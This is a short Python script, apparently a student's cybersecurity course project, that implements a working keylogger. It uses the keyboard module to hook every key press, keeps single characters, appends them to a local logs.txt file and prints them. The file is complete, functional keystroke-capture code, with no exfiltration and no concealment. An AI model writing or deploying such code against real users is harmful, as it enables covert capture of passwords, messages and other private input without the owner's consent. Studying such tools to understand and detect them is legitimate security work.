import keyboard #The keyboard module

def writer(data):
    with open("/Users/alvinliju/Documents/Brocamp/Week-1/Cybersec projects/Keylogger/logs.txt","a") as file:
        file.write(data)

def filter(char):
    if char is None:
        return ""
    elif len(char) > 1:
        return ""
    else:
        return char

def logger(event):
    writer(filter(event.name))
    print(filter(event.name))

keyboard.on_press(logger)
keyboard.wait()